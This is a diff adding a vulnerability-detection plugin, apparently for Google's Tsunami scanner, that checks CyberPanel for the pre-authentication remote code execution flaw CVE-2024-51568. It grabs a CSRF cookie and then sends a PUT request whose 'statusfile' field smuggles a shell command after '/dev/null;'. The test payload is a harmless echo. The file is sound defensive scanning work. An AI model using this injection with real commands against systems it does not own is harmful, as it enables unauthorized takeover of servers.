@@ -1,0 +1,92 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Cyberpanel_CVE_2024_51568"
+  author: "Pierre Precourt (pprecourt@google.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CYBERPANEL_PREAUTH_RCE"
+  }
+  title: "Cyberpanel is vulnerable to pre-authentication remote code execution"
+  description: "The instance of Cyberpanel is vulnerable to pre-authentication remote code execution (CVE-2024-51568)."
+  recommendation: "Update to version 2.3.7 or higher."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-51568"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "retrieve_CSRF_cookie"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_header: { name: "Set-Cookie" }
+            regexp: "csrftoken=([a-zA-Z0-9_]+);"
+            variable_name: "csrfcookie"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: PUT
+    uri: "dataBases/upgrademysqlstatus"
+    headers: [
+      { name: "Content-Type" value: "application/json" },
+      { name: "Cookie" value: "csrftoken={{ csrfcookie }}" },
+      { name: "X-CSRFToken" value: "{{ csrfcookie }}" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}" }
+    ]
+    data: "{\"statusfile\":\"/dev/null; {{ payload }}; #\",\"csrftoken\":\"{{ csrfcookie }}\"}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{{ payload_result }}" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "payload" value: "echo tsunami$((1250+50*2))" },
+    { name: "payload_result" value: "tsunami1350" }
+  ]
+
+  actions: [
+    "retrieve_CSRF_cookie",
+    "trigger_code_execution"
+  ]
+}
